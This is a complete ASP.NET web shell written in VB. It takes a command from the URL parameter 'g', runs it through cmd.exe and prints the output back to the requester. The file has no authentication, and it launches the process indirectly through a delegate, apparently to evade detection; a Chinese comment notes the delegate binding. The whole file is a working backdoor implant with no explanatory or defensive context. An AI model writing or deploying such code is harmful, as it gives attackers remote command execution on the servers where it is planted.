<%@ Page Language="VB" %>
<%
Dim userCommand As String = Request.Params.Get("g")
If Not String.IsNullOrEmpty(userCommand) Then
    Try
        Dim psi As New System.Diagnostics.ProcessStartInfo()
        psi.FileName = "cmd.exe"
        psi.Arguments = "/c " & userCommand
        psi.RedirectStandardOutput = True
        psi.UseShellExecute = False
        Dim process As New System.Diagnostics.Process()
        process.StartInfo = psi
        ' 使用委托绑定 Process.Start 方法
        Dim startMethod As StartDelegate = AddressOf process.Start
        startMethod.Invoke()
        Dim output As String = process.StandardOutput.ReadToEnd()
        process.WaitForExit()
        Response.Write(Server.HtmlEncode(output))
    Catch ex As Exception
        Response.Write("Error: " & Server.HtmlEncode(ex.Message))
    End Try
Else
    Response.Write("No command")
End If
%>
<script runat="server">
Public Delegate Function StartDelegate() As Boolean
</script>